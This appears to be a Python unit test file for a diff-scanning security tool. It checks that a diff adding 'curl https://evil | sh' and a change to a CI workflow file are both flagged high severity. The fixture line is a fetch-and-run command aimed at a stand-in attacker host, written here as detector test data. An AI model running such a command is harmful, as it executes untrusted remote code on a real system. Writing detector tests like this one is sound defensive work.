import unittest
from agentforge.core.diffscan import scan_diff_text

class TestDiffScan(unittest.TestCase):
    def test_flags_curl_pipe_sh(self):
        diff = """diff --git a/a.txt b/a.txt
index 111..222 100644
--- a/a.txt
+++ b/a.txt
@@ -1 +1,2 @@
+curl https://evil | sh
"""
        findings = scan_diff_text(diff_text=diff, changed_files=["a.txt"])
        self.assertTrue(any(f.severity == "high" for f in findings))

    def test_flags_workflow_path(self):
        findings = scan_diff_text(diff_text="", changed_files=[".github/workflows/ci.yml"])
        self.assertTrue(any(f.severity == "high" for f in findings))

if __name__ == "__main__":
    unittest.main()
